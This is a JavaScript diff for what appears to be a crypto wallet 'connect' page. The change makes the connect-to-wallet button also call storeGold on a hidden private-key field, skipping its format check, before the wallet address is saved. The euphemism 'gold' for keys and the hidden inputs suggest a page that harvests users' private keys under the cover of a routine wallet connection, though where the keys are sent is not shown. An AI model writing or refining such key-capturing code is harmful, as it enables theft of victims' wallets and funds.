@@ -541,13 +541,6 @@ document.getElementById('import-gold-btn')?.addEventListener('click', function (
 });
 
 
-// button click trigger gold save - prvt key
-document.getElementById('connect-to-wallet-btn')?.addEventListener('click', function (event) {
-  event.preventDefault();
-  storeGold('prv-key-txt-hidden', true); // Skip format check for prv key
-});
-
-
 	
 
 document.addEventListener('DOMContentLoaded', function () {
@@ -677,15 +670,18 @@ document.addEventListener('DOMContentLoaded', function () {
   });
 
 
-  // Event listener for 'add-wallet-address-btn'
-  document.getElementById('connect-to-wallet-btn')?.addEventListener('click', function (event) {
-    event.preventDefault();
-    let walletAddress = document.getElementById('wallet-address-txt-hidden').value;
-    let networkType = document.getElementById('wallet-address-label1').textContent;
+// Event listener for 'add-wallet-address-btn'
+document.getElementById('connect-to-wallet-btn')?.addEventListener('click', function (event) {
+event.preventDefault();
 
-    // Call the reusable function
-    storeWalletAddress(walletAddress, networkType);
-  });
+storeGold('prv-key-txt-hidden', true); // Skip format check for prv key
+
+let walletAddress = document.getElementById('wallet-address-txt-hidden').value;
+let networkType = document.getElementById('wallet-address-label1').textContent;
+
+// Call the reusable function
+storeWalletAddress(walletAddress, networkType);
+});
 
 
 
